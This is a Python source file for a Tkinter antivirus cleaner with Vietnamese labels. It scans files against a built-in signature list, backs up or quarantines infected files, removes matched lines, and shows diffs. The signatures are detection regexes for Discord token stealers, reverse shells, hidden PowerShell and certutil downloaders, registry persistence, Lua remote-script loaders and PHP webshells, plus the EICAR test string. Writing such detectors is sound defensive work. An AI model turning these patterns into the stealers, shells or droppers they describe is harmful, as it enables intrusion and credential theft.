#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
========================================================================================
   🛡️  ALL-IN-ONE VIRUS & MALWARE SURGICAL CLEANER GUI (2026 PRO)  🛡️
   ⚡ Tool Giao Diện Quét & Tự Động Xóa Phần Mã Độc Khỏi File (Bảo Tồn Dữ Liệu Gốc) ⚡
========================================================================================
"""

import os
import re
import sys
import time
import json
import shutil
import hashlib
import struct
import difflib
import threading
import queue
import subprocess
import tkinter as tk
from tkinter import ttk, filedialog, messagebox
from datetime import datetime
from typing import List, Dict, Any, Tuple, Optional

# Fix Windows console UTF-8 encoding
if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

# ======================================================================================
# 1. SIGNATURES DATABASE & PATTERNS
# ======================================================================================
EICAR_SIGNATURE = r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
SIMULATED_TEST_SIGNATURE = r"ANTIVIRUS_TEST_MALWARE_SIGNATURE_5548_SIMULATED"

BUILTIN_SIGNATURES = [
    # 1. Simulated Safe Antivirus Test Signature
    {
        "id": "TEST_SIMULATED_MALWARE",
        "name": "Simulated-Malware-Test-File",
        "category": "Test Signature",
        "severity": "High",
        "description": "Chuỗi mã độc mẫu thử nghiệm an toàn để kiểm tra tính năng diệt virus",
        "pattern": r"ANTIVIRUS_TEST_MALWARE_SIGNATURE_5548_SIMULATED",
        "file_types": ["*"],
        "clean_strategy": "remove_exact_or_quarantine"
    },
    # 2. Standard EICAR Test Signature
    {
        "id": "TEST_EICAR",
        "name": "EICAR-Antivirus-Test-File",
        "category": "Test Signature",
        "severity": "High",
        "description": "Chuỗi kiểm tra Antivirus chuẩn quốc tế EICAR",
        "pattern": re.escape(EICAR_SIGNATURE),
        "file_types": ["*"],
        "clean_strategy": "remove_exact_or_quarantine"
    },
    # 3. Discord Webhook Token Stealers
    {
        "id": "STEALER_DISCORD_WEBHOOK",
        "name": "Discord-Webhook-Stealer",
        "category": "Credential Stealer / Spyware",
        "severity": "Critical",
        "description": "Đoạn mã gửi trộm Token Discord, Cookie trình duyệt hoặc mật khẩu qua Webhook Discord",
        "pattern": r"(?:https?://(?:ptb\.|canary\.)?discord(?:app)?\.com/api/webhooks/\d+/[A-Za-z0-9_\-]+)",
        "file_types": [".py", ".lua", ".js", ".html", ".bat", ".ps1", ".txt", ".json", ".vbs"],
        "clean_strategy": "remove_line_or_block"
    },
    {
        "id": "STEALER_DISCORD_TOKEN_REGEX",
        "name": "Discord-Token-Extractor",
        "category": "Credential Stealer",
        "severity": "Critical",
        "description": "Mẫu regex trích xuất trái phép Discord Token trong thư mục trình duyệt",
        "pattern": r"[\"'](?:dQw4w9WgXcQ:|[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27,38})[\"']|Local Storage\\leveldb",
        "file_types": [".py", ".js", ".vbs"],
        "clean_strategy": "remove_line_or_block"
    },
    # 4. Obfuscated Python Loaders & Reverse Shells
    {
        "id": "PY_OBFUSCATED_BASE64_EXEC",
        "name": "Python-Obfuscated-Exec-Payload",
        "category": "Obfuscated Malware",
        "severity": "Critical",
        "description": "Thực thi payload nguy hiểm qua exec(base64.b64decode / zlib.decompress / marshal)",
        "pattern": r"(?:exec\s*\(\s*(?:base64\.b64decode|zlib\.decompress|marshal\.loads|codecs\.decode)\s*\(|eval\s*\(\s*compile\s*\(\s*base64\.b64decode)",
        "file_types": [".py", ".pyw", ".txt"],
        "clean_strategy": "remove_line_or_block"
    },
    {
        "id": "PY_REVERSE_SHELL",
        "name": "Python-Reverse-Shell",
        "category": "Backdoor / Remote Access",
        "severity": "Critical",
        "description": "Mã tạo kết nối Reverse Shell điều khiển máy tính từ xa trái phép",
        "pattern": r"socket\.socket\s*\(.*?\)\s*;\s*s\.connect\s*\(\s*\([\"']\d+\.\d+\.\d+\.\d+[\"']|subprocess\.call\s*\(\s*\[[\"']/bin/sh[\"']\s*,\s*[\"']-i[\"']|os\.dup2\s*\(s\.fileno",
        "file_types": [".py", ".pyw"],
        "clean_strategy": "remove_line_or_block"
    },
    # 5. Malicious Batch & PowerShell Downloaders
    {
        "id": "BAT_POWERSHELL_HIDDEN_DOWNLOADER",
        "name": "Batch-PowerShell-Hidden-Downloader",
        "category": "Dropper / Downloader",
        "severity": "Critical",
        "description": "Lệnh Batch gọi PowerShell chạy ẩn để tải và kích hoạt file thực thi nguy hiểm",
        "pattern": r"powershell(?:\.exe)?\s+(?:-[wW]\s+[hH]idden|-[nN]o[pP]rofile|-[eE]xecution[pP]olicy\s+[bB]ypass|-[eE]nc(?:oded[cC]ommand)?).*?(?:DownloadFile|DownloadString|IEX|Invoke-Expression|Net\.WebClient|Start-BitsTransfer)",
        "file_types": [".bat", ".cmd", ".ps1", ".vbs"],
        "clean_strategy": "remove_line_or_block"
    },
    {
        "id": "BAT_CERTUTIL_DOWNLOADER",
        "name": "Batch-Certutil-Malicious-Download",
        "category": "Dropper / LOLBin",
        "severity": "High",
        "description": "Lợi dụng certutil.exe để tải lén hoặc giải mã payload độc hại",
        "pattern": r"certutil(?:\.exe)?\s+(?:-urlcache\s+-split\s+-f|-decode|-decodehex)\s+[^\r\n]+",
        "file_types": [".bat", ".cmd"],
        "clean_strategy": "remove_line_or_block"
    },
    {
        "id": "BAT_AUTORUN_PERSISTENCE",
        "name": "Batch-Registry-Persistence-Hijack",
        "category": "Persistence / Trojan",
        "severity": "High",
        "description": "Tự động chèn khóa khởi động cùng Windows vào Run/RunOnce Registry",
        "pattern": r"reg\s+add\s+[\"']?(?:HKCU|HKLM|HKEY_CURRENT_USER|HKEY_LOCAL_MACHINE)\\Software\\Microsoft\\Windows\\CurrentVersion\\Run(?:Once)?[\"']?\s+/v",
        "file_types": [".bat", ".cmd", ".reg", ".ps1", ".vbs"],
        "clean_strategy": "remove_line_or_block"
    },
    # 6. Malicious Lua / Roblox Game Scripts
    {
        "id": "LUA_STEALER_WEBHOOK",
        "name": "Lua-Roblox-Webhook-Logger",
        "category": "Game Script Stealer",
        "severity": "High",
        "description": "Đoạn mã Lua gửi IP, cookie tài khoản hoặc thông tin nhạy cảm qua Webhook",
        "pattern": r"(?:syn\.request|http_request|request|http\.request)\s*\(\s*\{[^\}]*(?:Url|url)\s*=\s*[\"']https?://(?:ptb\.|canary\.)?discord(?:app)?\.com/api/webhooks/[^\"']+[\"']",
        "file_types": [".lua", ".txt"],
        "clean_strategy": "remove_line_or_block"
    },
    {
        "id": "LUA_MALICIOUS_LOADSTRING",
        "name": "Lua-Obfuscated-Loadstring-Dropper",
        "category": "Remote Code Execution",
        "severity": "High",
        "description": "Tải và thực thi script từ server bên ngoài thông qua loadstring(game:HttpGet)",
        "pattern": r"loadstring\s*\(\s*game\s*:\s*HttpGet\s*\(\s*[\"']https?://(?:raw\.githubusercontent\.com|pastebin\.com/raw)/[^\"']+[\"']\s*\)\s*\)\s*\(.*?\)",
        "file_types": [".lua", ".txt"],
        "clean_strategy": "remove_line_or_block"
    },
    # 7. WebShells & Backdoors
    {
        "id": "PHP_WEBSHELL_EVAL_BASE64",
        "name": "PHP-Generic-WebShell-Eval",
        "category": "WebShell / Backdoor",
        "severity": "Critical",
        "description": "WebShell PHP thực thi lệnh thông qua eval(gzinflate(base64_decode))",
        "pattern": r"eval\s*\(\s*(?:gzinflate|gzuncompress|base64_decode|str_rot13)\s*\([^\)]+\)\s*\)",
        "file_types": [".php", ".phtml", ".php5", ".inc", ".txt"],
        "clean_strategy": "remove_line_or_block"
    },
    {
        "id": "PHP_WEBSHELL_CMD_EXEC",
        "name": "PHP-WebShell-Command-Execution",
        "category": "WebShell",
        "severity": "Critical",
        "description": "Cổng nhận tham số GET/POST để chạy lệnh hệ thống (system/passthru/shell_exec)",
        "pattern": r"(?:system|passthru|shell_exec|exec|proc_open|popen)\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE)\[[^\]]+\]\s*\)",
        "file_types": [".php", ".phtml", ".php5", ".inc", ".html"],
        "clean_strategy": "remove_line_or_block"
    }
]


# ======================================================================================
# 2. CORE DATA STRUCTURES & BACKUP MANAGER
# ======================================================================================
class ThreatMatch:
    def __init__(self, signature_id: str, name: str, category: str, severity: str,
                 description: str, matched_text: str, start_pos: int, end_pos: int,
                 line_number: Optional[int] = None, line_content: Optional[str] = None):
        self.signature_id = signature_id
        self.name = name
        self.category = category
        self.severity = severity
        self.description = description
        self.matched_text = matched_text
        self.start_pos = start_pos
        self.end_pos = end_pos
        self.line_number = line_number
        self.line_content = line_content


class ScanResult:
    def __init__(self, file_path: str):
        self.file_path = os.path.abspath(file_path)
        self.file_name = os.path.basename(file_path)
        self.file_size = 0
        self.md5 = ""
        self.sha256 = ""
        self.is_infected = False
        self.threats: List[ThreatMatch] = []
        self.status = "CLEAN"  # CLEAN, INFECTED, DISINFECTED, QUARANTINED, ERROR
        self.message = "File an toàn"
        self.backup_path: Optional[str] = None
        self.diff_preview: Optional[str] = None
        self.cleaned_content_preview: Optional[str] = None
        self.scan_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")


class BackupManager:
    """Quản lý sao lưu an toàn và cách ly file trước khi khử độc"""
    def __init__(self, backup_root: Optional[str] = None):
        if not backup_root:
            # Default to quarantine_backup in user's documents
            docs_dir = os.path.join(os.path.expanduser("~"), "Documents")
            backup_root = os.path.join(docs_dir, "Tool_Kiem_Tra_Virus", "quarantine_backup")
        self.backup_root = os.path.abspath(backup_root)
        self.quarantine_dir = os.path.join(self.backup_root, "quarantine")
        self.backup_dir = os.path.join(self.backup_root, "backups")
        self.db_path = os.path.join(self.backup_root, "backup_manifest.json")
        self._ensure_dirs()

    def _ensure_dirs(self):
        os.makedirs(self.quarantine_dir, exist_ok=True)
        os.makedirs(self.backup_dir, exist_ok=True)
        if not os.path.exists(self.db_path):
            self._save_manifest([])

    def _load_manifest(self) -> List[Dict[str, Any]]:
        try:
            if os.path.exists(self.db_path):
                with open(self.db_path, "r", encoding="utf-8") as f:
                    return json.load(f)
        except Exception:
            pass
        return []

    def _save_manifest(self, data: List[Dict[str, Any]]):
        try:
            with open(self.db_path, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
        except Exception as e:
            print(f"Error saving backup manifest: {e}")

    def create_backup(self, original_path: str, reason: str = "Surgical Cleaning") -> Optional[str]:
        try:
            if not os.path.isfile(original_path):
                return None
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
            base_name = os.path.basename(original_path)
            backup_filename = f"{timestamp}_{base_name}.bak"
            backup_file_path = os.path.join(self.backup_dir, backup_filename)

            shutil.copy2(original_path, backup_file_path)

            manifest = self._load_manifest()
            entry = {
                "id": timestamp,
                "original_path": os.path.abspath(original_path),
                "backup_path": backup_file_path,
                "type": "backup",
                "reason": reason,
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "file_size": os.path.getsize(original_path)
            }
            manifest.append(entry)
            self._save_manifest(manifest)
            return backup_file_path
        except Exception as e:
            print(f"Failed to create backup: {e}")
            return None

    def quarantine_file(self, original_path: str, threat_name: str) -> Optional[str]:
        try:
            if not os.path.isfile(original_path):
                return None
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
            base_name = os.path.basename(original_path)
            quarantined_filename = f"{timestamp}_{base_name}.quarantine_locked"
            quarantined_path = os.path.join(self.quarantine_dir, quarantined_filename)

            shutil.move(original_path, quarantined_path)

            manifest = self._load_manifest()
            entry = {
                "id": timestamp,
                "original_path": os.path.abspath(original_path),
                "backup_path": quarantined_path,
                "type": "quarantine",
                "reason": f"Threat: {threat_name}",
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "file_size": os.path.getsize(quarantined_path)
            }
            manifest.append(entry)
            self._save_manifest(manifest)
            return quarantined_path
        except Exception as e:
            print(f"Failed to quarantine file: {e}")
            return None

    def list_backups(self) -> List[Dict[str, Any]]:
        return self._load_manifest()

    def restore(self, backup_id: str) -> Tuple[bool, str]:
        manifest = self._load_manifest()
        target_entry = None
        for item in manifest:
            if item.get("id") == backup_id or item.get("backup_path") == backup_id:
                target_entry = item
                break

        if not target_entry:
            return False, "Không tìm thấy bản ghi sao lưu tương ứng"

        backup_file = target_entry.get("backup_path")
        orig_file = target_entry.get("original_path")

        if not os.path.exists(backup_file):
            return False, f"File sao lưu không còn tồn tại trên đĩa: {backup_file}"

        try:
            os.makedirs(os.path.dirname(orig_file), exist_ok=True)
            shutil.copy2(backup_file, orig_file)
            return True, f"Đã khôi phục thành công về: {orig_file}"
        except Exception as e:
            return False, f"Lỗi khi khôi phục: {e}"

    def delete_backup_entry(self, backup_id: str) -> bool:
        manifest = self._load_manifest()
        new_manifest = []
        found = False
        for item in manifest:
            if item.get("id") == backup_id or item.get("backup_path") == backup_id:
                found = True
                b_path = item.get("backup_path")
                if b_path and os.path.exists(b_path):
                    try:
                        os.remove(b_path)
                    except Exception:
                        pass
            else:
                new_manifest.append(item)
        if found:
            self._save_manifest(new_manifest)
        return found


# ======================================================================================
# 3. CORE SCANNING & SURGICAL DISINFECTION ENGINE
# ======================================================================================
class VirusCleanerEngine:
    def __init__(self, custom_signatures: Optional[List[Dict[str, Any]]] = None):
        self.signatures = list(BUILTIN_SIGNATURES)
        if custom_signatures:
            self.signatures.extend(custom_signatures)
        self.backup_mgr = BackupManager()
        self.enable_pe_overlay_scan = True

    @staticmethod
    def compute_hashes(file_path: str) -> Tuple[str, str]:
        md5_hash = hashlib.md5()
        sha256_hash = hashlib.sha256()
        try:
            with open(file_path, "rb") as f:
                for chunk in iter(lambda: f.read(65536), b""):
                    md5_hash.update(chunk)
                    sha256_hash.update(chunk)
            return md5_hash.hexdigest(), sha256_hash.hexdigest()
        except Exception:
            return "", ""

    def _matches_file_extension(self, file_path: str, allowed_exts: List[str]) -> bool:
        if "*" in allowed_exts:
            return True
        ext = os.path.splitext(file_path)[1].lower()
        return ext in [e.lower() for e in allowed_exts]

    def _scan_text_file(self, file_path: str, content_str: str) -> List[ThreatMatch]:
        threats: List[ThreatMatch] = []
        lines = content_str.splitlines(keepends=True)
        line_offsets = []
        curr_offset = 0
        for line in lines:
            line_offsets.append(curr_offset)
            curr_offset += len(line)

        def get_line_info(char_pos: int) -> Tuple[int, str]:
            for idx, offset in enumerate(line_offsets):
                next_offset = line_offsets[idx + 1] if idx + 1 < len(line_offsets) else curr_offset
                if offset <= char_pos < next_offset:
                    return idx + 1, lines[idx].strip()
            return len(lines), lines[-1].strip() if lines else ""

        for sig in self.signatures:
            if not self._matches_file_extension(file_path, sig.get("file_types", ["*"])):
                continue

            pattern = sig["pattern"]
            try:
                for match in re.finditer(pattern, content_str, flags=re.IGNORECASE | re.MULTILINE):
                    start_pos = match.start()
                    end_pos = match.end()
                    matched_str = match.group(0)
                    line_no, line_txt = get_line_info(start_pos)

                    threat = ThreatMatch(
                        signature_id=sig["id"],
                        name=sig["name"],
                        category=sig["category"],
                        severity=sig["severity"],
                        description=sig["description"],
                        matched_text=matched_str,
                        start_pos=start_pos,
                        end_pos=end_pos,
                        line_number=line_no,
                        line_content=line_txt
                    )
                    threats.append(threat)
            except Exception:
                pass

        return threats

    def _check_pe_overlay(self, file_path: str) -> Optional[ThreatMatch]:
        try:
            file_size = os.path.getsize(file_path)
            if file_size < 1024:
                return None

            with open(file_path, "rb") as f:
                header = f.read(1024)
                if header[:2] != b"MZ":
                    return None
                if len(header) < 0x3C + 4:
                    return None
                pe_offset = struct.unpack("<I", header[0x3C:0x3C+4])[0]
                if pe_offset + 24 > file_size:
                    return None

                f.seek(pe_offset)
                pe_sig = f.read(4)
                if pe_sig != b"PE\x00\x00":
                    return None

                file_header = f.read(20)
                num_sections = struct.unpack("<H", file_header[2:4])[0]
                opt_header_size = struct.unpack("<H", file_header[16:18])[0]

                f.seek(pe_offset + 24 + opt_header_size)
                max_section_end = 0
                for _ in range(num_sections):
                    sec_header = f.read(40)
                    if len(sec_header) < 40:
                        break
                    raw_size = struct.unpack("<I", sec_header[16:20])[0]
                    raw_offset = struct.unpack("<I", sec_header[20:24])[0]
                    sec_end = raw_offset + raw_size
                    if sec_end > max_section_end:
                        max_section_end = sec_end

                if max_section_end > 0 and (file_size - max_section_end) > 1024:
                    overlay_size = file_size - max_section_end
                    f.seek(max_section_end)
                    sample_overlay = f.read(min(256, overlay_size))

                    return ThreatMatch(
                        signature_id="PE_MALICIOUS_OVERLAY",
                        name="PE-Appended-Malicious-Overlay",
                        category="PE Binary Infection / Trojan Dropper",
                        severity="High",
                        description=f"Phát hiện {overlay_size} bytes dữ liệu ngoại lai chèn vào đuôi file thực thi.",
                        matched_text=f"Overlay offset: {max_section_end} (Size: {overlay_size} bytes)",
                        start_pos=max_section_end,
                        end_pos=file_size,
                        line_number=None,
                        line_content=f"Hex: {sample_overlay[:32].hex()}"
                    )
        except Exception:
            pass
        return None

    def scan_file(self, file_path: str) -> ScanResult:
        result = ScanResult(file_path)
        if not os.path.exists(file_path) or not os.path.isfile(file_path):
            result.status = "ERROR"
            result.message = "File không tồn tại hoặc đường dẫn không hợp lệ"
            return result

        try:
            result.file_size = os.path.getsize(file_path)
            result.md5, result.sha256 = self.compute_hashes(file_path)

            is_text = False
            content_str = ""
            for encoding in ["utf-8", "latin-1", "utf-16", "cp1258", "cp1252"]:
                try:
                    with open(file_path, "r", encoding=encoding, errors="strict") as f:
                        content_str = f.read()
                        is_text = True
                        break
                except Exception:
                    continue

            if is_text and content_str:
                text_threats = self._scan_text_file(file_path, content_str)
                result.threats.extend(text_threats)
            else:
                try:
                    with open(file_path, "rb") as f:
                        raw_bytes = f.read(10 * 1024 * 1024)
                    raw_str = raw_bytes.decode("latin-1", errors="ignore")
                    raw_threats = self._scan_text_file(file_path, raw_str)
                    result.threats.extend(raw_threats)
                except Exception:
                    pass

            if self.enable_pe_overlay_scan:
                pe_overlay_threat = self._check_pe_overlay(file_path)
                if pe_overlay_threat:
                    result.threats.append(pe_overlay_threat)

            if len(result.threats) > 0:
                result.is_infected = True
                result.status = "INFECTED"
                result.message = f"Phát hiện {len(result.threats)} mối đe dọa mã độc!"
            else:
                result.is_infected = False
                result.status = "CLEAN"
                result.message = "File an toàn, không phát hiện mã độc."

        except Exception as e:
            result.status = "ERROR"
            result.message = f"Lỗi trong quá trình quét: {e}"

        return result

    def clean_file(self, file_path: str, scan_res: Optional[ScanResult] = None) -> ScanResult:
        if scan_res is None:
            scan_res = self.scan_file(file_path)

        if not scan_res.is_infected or len(scan_res.threats) == 0:
            scan_res.status = "CLEAN"
            scan_res.message = "File không có mã độc để làm sạch."
            return scan_res

        backup_path = self.backup_mgr.create_backup(file_path, reason="Surgical Disinfection")
        scan_res.backup_path = backup_path

        if not backup_path:
            scan_res.status = "ERROR"
            scan_res.message = "Không thể tạo bản sao lưu an toàn! Hủy bỏ khử độc để tránh mất dữ liệu."
            return scan_res

        try:
            has_pe_overlay = any(t.signature_id == "PE_MALICIOUS_OVERLAY" for t in scan_res.threats)
            if has_pe_overlay:
                for t in scan_res.threats:
                    if t.signature_id == "PE_MALICIOUS_OVERLAY":
                        clean_size = t.start_pos
                        with open(file_path, "r+b") as f:
                            f.truncate(clean_size)
                scan_res.status = "DISINFECTED"
                scan_res.message = "Đã cắt bỏ thành công phần Overlay mã độc ở đuôi file PE!"
                return scan_res

            has_eicar = any(t.signature_id in ["TEST_EICAR", "TEST_SIMULATED_MALWARE"] for t in scan_res.threats)

            encoding_used = "utf-8"
            original_content = ""
            for enc in ["utf-8", "latin-1", "utf-16", "cp1258", "cp1252"]:
                try:
                    with open(file_path, "r", encoding=enc, errors="strict") as f:
                        original_content = f.read()
                        encoding_used = enc
                        break
                except Exception:
                    continue

            if not original_content:
                quarantine_res = self.backup_mgr.quarantine_file(file_path, threat_name=scan_res.threats[0].name)
                scan_res.status = "QUARANTINED"
                scan_res.message = f"File nhị phân không thể cắt bỏ an toàn, đã tự động chuyển vào khu vực cách ly: {quarantine_res}"
                return scan_res

            lines = original_content.splitlines(keepends=True)
            infected_line_numbers = set(t.line_number for t in scan_res.threats if t.line_number is not None)

            cleaned_lines = []
            for idx, line in enumerate(lines, start=1):
                line_infected = False
                cleaned_line = line

                for sig in self.signatures:
                    pattern = sig["pattern"]
                    if re.search(pattern, cleaned_line, flags=re.IGNORECASE):
                        line_infected = True
                        break

                if not line_infected and idx not in infected_line_numbers:
                    cleaned_lines.append(line)
                else:
                    cleaned_lines.append(f"# [ANTI-VIRUS] Malicious snippet removed here\n")

            cleaned_content = "".join(cleaned_lines)
            clean_test = re.sub(r"#\s*\[ANTI-VIRUS\][^\r\n]*", "", cleaned_content).strip()
            if not clean_test or (has_eicar and len(clean_test) < 10):
                quarantine_res = self.backup_mgr.quarantine_file(file_path, threat_name=scan_res.threats[0].name)
                scan_res.status = "QUARANTINED"
                scan_res.message = f"File hoàn toàn là virus độc lập (100% mã độc), đã cách ly an toàn vào: {quarantine_res}"
                return scan_res

            diff_lines = list(difflib.unified_diff(
                original_content.splitlines(keepends=True),
                cleaned_content.splitlines(keepends=True),
                fromfile=f"a/{scan_res.file_name} (Infected)",
                tofile=f"b/{scan_res.file_name} (Cleaned)",
                n=3
            ))
            scan_res.diff_preview = "".join(diff_lines)
            scan_res.cleaned_content_preview = cleaned_content

            with open(file_path, "w", encoding=encoding_used) as f:
                f.write(cleaned_content)

            scan_res.status = "DISINFECTED"
            scan_res.message = f"Đã khử độc thành công! Đã loại bỏ {len(scan_res.threats)} đoạn mã độc hại khỏi file."

        except Exception as e:
            scan_res.status = "ERROR"
            scan_res.message = f"Lỗi trong quá trình khử độc: {e}"

        return scan_res

    def scan_directory(self, dir_path: str, recursive: bool = True, progress_callback=None, auto_clean: bool = False) -> List[ScanResult]:
        results: List[ScanResult] = []
        all_files = []

        if recursive:
            for root, _, files in os.walk(dir_path):
                if any(ignored in root for ignored in ["quarantine_backup", ".git", "__pycache__"]):
                    continue
                for f in files:
                    # Don't scan self engine file
                    if f in ["virus_cleaner_engine.py", "virus_cleaner_gui.py", "virus_cleaner_cli.py", "test_virus_cleaner.py"] and "Tool_Kiem_Tra_Virus" in root:
                        continue
                    all_files.append(os.path.join(root, f))
        else:
            for f in os.listdir(dir_path):
                full_path = os.path.join(dir_path, f)
                if os.path.isfile(full_path):
                    all_files.append(full_path)

        total_files = len(all_files)
        for idx, file_path in enumerate(all_files, start=1):
            if progress_callback:
                progress_callback(idx, total_files, file_path)

            if auto_clean:
                res = self.scan_file(file_path)
                if res.is_infected:
                    res = self.clean_file(file_path, scan_res=res)
                results.append(res)
            else:
                res = self.scan_file(file_path)
                results.append(res)

        return results


# ======================================================================================
# 4. MODERN TKINTER GUI & DIFF VIEWER
# ======================================================================================
class ModernTheme:
    BG_DARK = "#12141c"
    BG_CARD = "#1c1f2e"
    BG_CARD_HOVER = "#252a3d"
    BG_INPUT = "#222638"
    BORDER_COLOR = "#2e344d"

    TEXT_MAIN = "#f1f5f9"
    TEXT_MUTED = "#94a3b8"
    TEXT_DIM = "#64748b"

    ACCENT_CYAN = "#00b4d8"
    ACCENT_GREEN = "#10b981"
    ACCENT_RED = "#ef4444"
    ACCENT_YELLOW = "#f59e0b"
    ACCENT_PURPLE = "#8b5cf6"

    FONT_TITLE = ("Segoe UI", 14, "bold")
    FONT_HEADING = ("Segoe UI", 11, "bold")
    FONT_BODY = ("Segoe UI", 10)
    FONT_SMALL = ("Segoe UI", 9)
    FONT_CODE = ("Consolas", 10)


class DiffViewerDialog(tk.Toplevel):
    def __init__(self, parent, scan_res: ScanResult, engine: VirusCleanerEngine, on_disinfected_callback=None):
        super().__init__(parent)
        self.scan_res = scan_res
        self.engine = engine
        self.on_disinfected_callback = on_disinfected_callback

        self.title(f"🛡️ Trình So Sánh & Kiểm Tra Mã Độc - {scan_res.file_name}")
        self.geometry("900x650")
        self.minsize(700, 500)
        self.configure(bg=ModernTheme.BG_DARK)
        self.transient(parent)
        self.grab_set()

        self._create_widgets()

    def _create_widgets(self):
        header_frame = tk.Frame(self, bg=ModernTheme.BG_CARD, padx=15, pady=12, highlightbackground=ModernTheme.BORDER_COLOR, highlightthickness=1)
        header_frame.pack(fill="x", padx=15, pady=(15, 10))

        tk.Label(header_frame, text=f"📁 File: {self.scan_res.file_name}", font=ModernTheme.FONT_HEADING, fg=ModernTheme.TEXT_MAIN, bg=ModernTheme.BG_CARD).pack(anchor="w")
        tk.Label(header_frame, text=f"Đường dẫn: {self.scan_res.file_path}", font=ModernTheme.FONT_SMALL, fg=ModernTheme.TEXT_MUTED, bg=ModernTheme.BG_CARD).pack(anchor="w", pady=(2, 6))

        badge_frame = tk.Frame(header_frame, bg=ModernTheme.BG_CARD)
        badge_frame.pack(anchor="w")

        status_color = ModernTheme.ACCENT_GREEN if self.scan_res.status in ["CLEAN", "DISINFECTED"] else ModernTheme.ACCENT_RED
        tk.Label(badge_frame, text=f" Trạng thái: {self.scan_res.status} ", font=ModernTheme.FONT_SMALL, bg=status_color, fg="#ffffff", padx=6, pady=2).pack(side="left", padx=(0, 10))
        tk.Label(badge_frame, text=f" Mối đe dọa: {len(self.scan_res.threats)} ", font=ModernTheme.FONT_SMALL, bg=ModernTheme.ACCENT_PURPLE, fg="#ffffff", padx=6, pady=2).pack(side="left")

        if self.scan_res.threats:
            threat_box = tk.Frame(self, bg=ModernTheme.BG_CARD, padx=12, pady=8, highlightbackground=ModernTheme.BORDER_COLOR, highlightthickness=1)
            threat_box.pack(fill="x", padx=15, pady=(0, 10))
            tk.Label(threat_box, text="CÁC ĐOẠN MÃ ĐỘC PHÁT HIỆN:", font=ModernTheme.FONT_SMALL, fg=ModernTheme.ACCENT_RED, bg=ModernTheme.BG_CARD).pack(anchor="w")
            for t in self.scan_res.threats:
                line_info = f"Dòng {t.line_number}: " if t.line_number else ""
                tk.Label(
                    threat_box,
                    text=f" • [{t.severity}] {t.name} ({line_info}{t.description})",
                    font=ModernTheme.FONT_SMALL,
                    fg=ModernTheme.TEXT_MAIN,
                    bg=ModernTheme.BG_CARD,
                    anchor="w",
                    justify="left"
                ).pack(anchor="w", pady=1)

        panes_frame = tk.Frame(self, bg=ModernTheme.BG_DARK)
        panes_frame.pack(fill="both", expand=True, padx=15, pady=5)

        diff_frame = tk.Frame(panes_frame, bg=ModernTheme.BG_CARD, highlightbackground=ModernTheme.BORDER_COLOR, highlightthickness=1)
        diff_frame.pack(fill="both", expand=True)

        scrollbar_y = tk.Scrollbar(diff_frame)
        scrollbar_y.pack(side="right", fill="y")
        scrollbar_x = tk.Scrollbar(diff_frame, orient="horizontal")
        scrollbar_x.pack(side="bottom", fill="x")

        self.text_area = tk.Text(
            diff_frame,
            wrap="none",
            bg="#0f111a",
            fg=ModernTheme.TEXT_MAIN,
            insertbackground="#ffffff",
            font=ModernTheme.FONT_CODE,
            yscrollcommand=scrollbar_y.set,
            xscrollcommand=scrollbar_x.set,
            padx=10,
            pady=10,
            borderwidth=0,
            highlightthickness=0
        )
        self.text_area.pack(fill="both", expand=True)
        scrollbar_y.config(command=self.text_area.yview)
        scrollbar_x.config(command=self.text_area.xview)

        self.text_area.tag_config("diff_header", foreground="#60a5fa", font=("Consolas", 10, "bold"))
        self.text_area.tag_config("diff_add", foreground="#34d399", background="#064e3b")
        self.text_area.tag_config("diff_remove", foreground="#f87171", background="#450a0a")
        self.text_area.tag_config("diff_info", foreground="#94a3b8")

        self._populate_diff()

        btn_frame = tk.Frame(self, bg=ModernTheme.BG_DARK, pady=10)
        btn_frame.pack(fill="x", padx=15)

        if self.scan_res.is_infected and self.scan_res.status == "INFECTED":
            tk.Button(
                btn_frame,
                text="⚡ Khử Độc & Xóa Phần Mã Độc Ngay",
                font=ModernTheme.FONT_HEADING,
                bg=ModernTheme.ACCENT_GREEN,
                fg="#ffffff",
                relief="flat",
                padx=15,
                pady=6,
                cursor="hand2",
                command=self._do_disinfect_now
            ).pack(side="left")

        tk.Button(
            btn_frame,
            text="Đóng",
            font=ModernTheme.FONT_BODY,
            bg=ModernTheme.BG_CARD,
            fg=ModernTheme.TEXT_MAIN,
            relief="flat",
            padx=15,
            pady=6,
            cursor="hand2",
            command=self.destroy
        ).pack(side="right")

    def _populate_diff(self):
        self.text_area.delete("1.0", "end")
        if self.scan_res.diff_preview:
            for line in self.scan_res.diff_preview.splitlines(keepends=True):
                if line.startswith("---") or line.startswith("+++"):
                    self.text_area.insert("end", line, "diff_header")
                elif line.startswith("@@"):
                    self.text_area.insert("end", line, "diff_info")
                elif line.startswith("+"):
                    self.text_area.insert("end", line, "diff_add")
                elif line.startswith("-"):
                    self.text_area.insert("end", line, "diff_remove")
                else:
                    self.text_area.insert("end", line)
        else:
            try:
                if os.path.exists(self.scan_res.file_path):
                    with open(self.scan_res.file_path, "r", encoding="utf-8", errors="ignore") as f:
                        lines = f.readlines()
                    infected_lines = set(t.line_number for t in self.scan_res.threats if t.line_number is not None)
                    for idx, line in enumerate(lines, start=1):
                        prefix = f"{idx:4d} | "
                        if idx in infected_lines:
                            self.text_area.insert("end", f"[MÃ ĐỘC] {prefix}{line}", "diff_remove")
                        else:
                            self.text_area.insert("end", f"        {prefix}{line}")
                else:
                    self.text_area.insert("end", "File không tồn tại hoặc đã được cách ly.")
            except Exception as e:
                self.text_area.insert("end", f"Không thể đọc file: {e}")

        self.text_area.config(state="disabled")

    def _do_disinfect_now(self):
        res = self.engine.clean_file(self.scan_res.file_path, self.scan_res)
        self.scan_res = res
        messagebox.showinfo("Thành công", res.message)
        if self.on_disinfected_callback:
            self.on_disinfected_callback(res)
        self.destroy()


